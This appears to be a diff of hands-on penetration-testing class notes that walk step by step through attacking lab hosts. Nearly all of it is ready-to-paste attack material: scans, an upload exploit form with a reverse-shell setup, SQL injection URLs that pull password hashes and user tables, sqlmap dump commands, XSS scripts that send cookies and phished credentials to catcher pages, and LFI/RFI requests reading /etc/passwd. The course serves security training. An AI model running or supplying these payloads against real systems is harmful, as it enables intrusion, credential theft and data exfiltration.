+gcc -o boom2 exploit2.c
+ 
+./boom2
+ 
+id
+-----------------------------------------------------------------------
+ 
+......YEAH - do the happy dance!!!!
+ 
+ 
+ 
+ 
+ 
+ ##################
+# Attacking Sedna #
+###################
+ 
+Attack steps:
+-------------
+ 
+ 
+ 
+Step 1: Ping sweep the target network
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+Step 2: Port scan/Bannergrab the target host
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.86
+-----------------------------------------------------------------------
+ 
+ 
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         (protocol 2.0)
+53/tcp   open     domain      ISC BIND 9.9.5-3-Ubuntu
+80/tcp   open     http        Apache httpd 2.4.7 ((Ubuntu))
+110/tcp  open     pop3        Dovecot pop3d
+111/tcp  open     rpcbind     2-4 (RPC #100000)
+139/tcp  open     netbios-ssn Samba smbd 3.X (workgroup: SEDNA)
+143/tcp  open     imap        Dovecot imapd
+445/tcp  open     netbios-ssn Samba smbd 3.X (workgroup: SEDNA)
+514/tcp  filtered shell
+993/tcp  open     ssl/imap    Dovecot imapd
+995/tcp  open     ssl/pop3    Dovecot pop3d
+8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.40%I=7%D=1/26%Time=5A6B4540%P=x86_64-pc-linux-gnu%r(NULL
+SF:,29,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
+ 
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 246.11 seconds
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Step 3: Vulnerability scan the webserver ports
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.86
+ 
+perl nikto.pl -h 172.31.2.86:8080
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+Step 4: Perform directory bruteforce against the target host
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.86 -v
+-----------------------------------------------------------------------
+ 
+ 
+ 
+                  or with dirbuster (dirb)
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz
+
+sudo apt install -y libcurl4-openssl-dev
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.86 wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+### dirb output ###
+==> DIRECTORY: http://172.31.2.86/blocks/
+==> DIRECTORY: http://172.31.2.86/files/
+==> DIRECTORY: http://172.31.2.86/modules/
+==> DIRECTORY: http://172.31.2.86/system/
+==> DIRECTORY: http://172.31.2.86/themes/
+ 
++ http://172.31.2.86/robots.txt (CODE:200|SIZE:36)
++ http://172.31.2.86/server-status (CODE:403|SIZE:291)
+### dirb output ###
+ 
+ 
+ 
+ 
+ 
+Browsed each of the directories and found that inside of the /themes folder contained the vulnerable application Builder Engine 3.5.0
+ 
+An exploit for this application can be found at:
+https://www.exploit-db.com/exploits/40390/
+ 
+ 
+ 
+ 
+ 
+-------------------save this a "BuilderEngine.html"-------------------
+<html>
+<body>
+<form method="post" action="http://172.31.2.86/themes/dashboard/assets/plugins/jquery-file-upload/server/php/"
+ 
+enctype="multipart/form-data">
+    <input type="file" name="files[]" />
+    <input type="submit" value="send" />
+</form>
+</body>
+</html>
+-----------------------------------------------------------------------
+ 
+ 
+Download this webshell (http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz) to your local machine.
+ 
+Change the IP address in the source code of the webshell to another server in the lab network that you have root access to.
+ 
+On the other server run:
+nc -lvp 1234
+ 
+Then upload the pentestmonkey reverseshell to .86
+ 
+============================================ Attacking another server because I need a reverse shell =========================================
+ 
+##################
+# Day 1 Homework #
+##################
+Send Ivana an email ivana{a-t}strategicsec{d-o-t}.com with a word document that contains screenshots of everything that we have covered so far. Make the subject of the email "First Name - Last Name - CyberWar Day 1" (ex: Joseph - McCray - CyberWar Day 1).
+ 
+Also be sure to name the attached file "FirstName.LastName.CyberwarDay1.docx" (Joseph.McCray.CyberWarDay1.docx).
+ 
+NOTE: This is what is required in order to receive your certificate of completion and CPEs.
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+   
+    1. Does the website talk to a DB?
+        - Look for parameter passing (ex: site.com/page.php?id=4)
+        - If yes - try SQL Injection
+ 
+    2. Can I or someone else see what I type?
+        - If yes - try XSS
+ 
+    3. Does the page reference a file?
+        - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 45.77.162.239
+ 
+ 
+Start here:
+---------------------------Paste this into Firefox---------------------
+http://45.77.162.239/
+-----------------------------------------------------------------------
+ 
+ 
+Moving on to the login page.
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/login.aspx
+-------------------------------------------------------------------------------------
+ 
+I entered a single quote (') for both the user name and the password. I got the following error:
+ 
+Let's try throwing a single quote (') in there:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2'
+-------------------------------------------------------------------------------------
+ 
+I get the following error:
+ 
+Unclosed quotation mark after the character string ''.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+ 
+Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#########################################################################################
+# SQL Injection                                                                         #
+# https://s3.amazonaws.com/infosecaddictsfiles/1-Intro_To_SQL_Intection.pptx            #
+#########################################################################################
+ 
+ 
+- Another quick way to test for SQLI is to remove the parameter value
+ 
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#############################
+# Union-Based SQL Injection #
+#############################
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 order by 100--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 50--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 25--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 10--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 5--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 6--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 7--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 8--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 9--
+http://45.77.162.239/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+---------------------------------------------------------------------------------------------------------
+ 
+    We are using a union select statement because we are joining the developer's query with one of our own.
+    Reference:
+    http://www.techonthenet.com/sql/union.php
+    The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
+    It removes duplicate rows between the various SELECT statements.
+ 
+    Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+---------------------------------------------------------------------------------------------------------
+    Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Another way is to see if you can get the backend to perform an arithmetic function
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=(2)
+http://45.77.162.239/bookdetail.aspx?id=(4-2)  
+http://45.77.162.239/bookdetail.aspx?id=(4-1)
+---------------------------------------------------------------------------------------------------------
+ 
+- This is some true/false logic testing
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=2--
+http://45.77.162.239/bookdetail.aspx?id=1*1
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 >-1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<99#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<>1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 2 != 3--
+http://45.77.162.239/bookdetail.aspx?id=2 &0#
+-------------------------------------------------------------------------------------
+ 
+-- Now that we've seen the differences in the webpage with True/False SQL Injection - let's see what we can learn using it
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=2--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='joe' and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='dbo' and 1=1--
+---------------------------------------------------------------------------------------
+ 
+ 
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+     
+3 - Total Characters
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
+---------------------------------------------------------------------------------------------------------
+ 
+Let's go for a quick check to see if it's DBO
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+-------------------------------------------------------------------------------------
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+ 
+D  - 1st Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+---------------------------------------------------------------------------------------------------------
+ 
+B - 2nd Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+---------------------------------------------------------------------------------------------------------
+ 
+O - 3rd Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##########
+# Sqlmap #
+##########
+If you want to see how we automate all of the SQL Injection attacks you can log into your StrategicSec-Ubuntu-VM and run the following commands:
+---------------------------Type This-----------------------------------
+cd /home/strategicsec/toolz/sqlmap-dev/
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -b
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --current-user
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --current-db
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --dbs
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp --tables
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns --dump
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns --dump
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --users --passwords
+------------------------------------------------------------------------
+ 
+ 
+ 
+#######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/
+-------------------------------------------------------------------------------------
+ 
+ 
+Clicking on the Acer Link:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer
+-------------------------------------------------------------------------------------
+ 
+    - Found parameter passing (answer yes to question 1)
+    - Insert ' to test for SQLI
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer'
+-------------------------------------------------------------------------------------  
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
+-------------------------------------------------------------------------------------  
+ 
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '12' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
+-------------------------------------------------------------------------------------
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-------------------------------------------------------------------------------------
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+------------------------------------------------------------------------------------- -------------------
+ 
+ 
+ 
+ 
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+ 
+ 
+###############################################################################
+# What is XSS                                                                 #
+# https://s3.amazonaws.com/infosecaddictsfiles/2-Intro_To_XSS.pptx            #
+###############################################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+    ---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+    -------------------------------------------------------------------------------------
+ 
+    A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert('So this is XSS')</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+ 
+3. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert(document.cookie)</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+4. Now replace that alert script with:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+    -------------------------------------------------------------------------------------
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+   ---------------------------Paste this into Firefox-----------------------------------
+   http://45.63.104.73/xss_practice/cookie_stealer_logs.html
+   -------------------------------------------------------------------------------------  
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+-------------------------------------------------------------------------------------  
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+Option 1
+--------
+---------------------------Paste this into Firefox-----------------------------------
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+Now view the stolen cookie at:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/passwords.html
+-------------------------------------------------------------------------------------  
+ 
+ 
+Option 2
+--------
+-------------------------Paste this into Firefox-----------------------------------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+ 
+ 
+Now view the stolen cookie at:
+http://45.63.104.73/xss_practice/username_password_logs.html
+ 
+ 
+ 
+ 
+#########################################
+# Let's try a local file include (LFI)  #
+#########################################
+- Here is an example of an LFI
+- Open this page in Firefox:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=contactus.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+- Notice the page name (showfile.php) and the parameter name (filename) and the filename (contactus.txt)
+- Here you see a direct reference to a file on the local filesystem of the victim machine.
+- You can attack this by doing the following:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=/etc/passwd
+-------------------------------------------------------------------------------------
+ 
+ 
+- This is an example of a Local File Include (LFI), to change this attack into a Remote File Include (RFI) you need some content from
+- somewhere else on the Internet. Here is an example of a text file on the web:
+-------------------------Paste this into Firefox-----------------------------------
+http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+- Now we can attack the target via RFI like this:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+###############################
+# How much fuzzing is enough? #
+###############################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+ 
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+ 
+ 
+Step 1: Ask yourself the 3 questions per page of the site.
+ 
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+ 
+Step 3: When you load your fuzz strings - use the following decision tree
+ 
+    - Are the fuzz strings causing a default error message (example 404)?
+        - If this is the case then it is most likely NOT vulnerable
+ 
+    - Are the fuzz strings causing a WAF or LB custom error message?
+        - If this is the case then you need to find an encoding method to bypass
+ 
+ 
+    - Are the fuzz strings causing an error message that discloses the backend type?
+        - If yes, then identify DB type and find correct syntax to successfully exploit
+        - Some example strings that I use are:
+            '
+            "
+            ()          <----- Take the parameter value and put it in parenthesis
+            (5-1)       <----- See if you can perform an arithmetic function
+ 
+ 
+    - Are the fuzz strings rendering executable code?
+        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+        - Some example strings that I use are:
+            <b>hello</b>
+            <u>hello</u>
+            <script>alert(123);</script>
+            <script>alert(xss);</script>
+            <script>alert('xss');</script>
+            <script>alert("xss");</script>
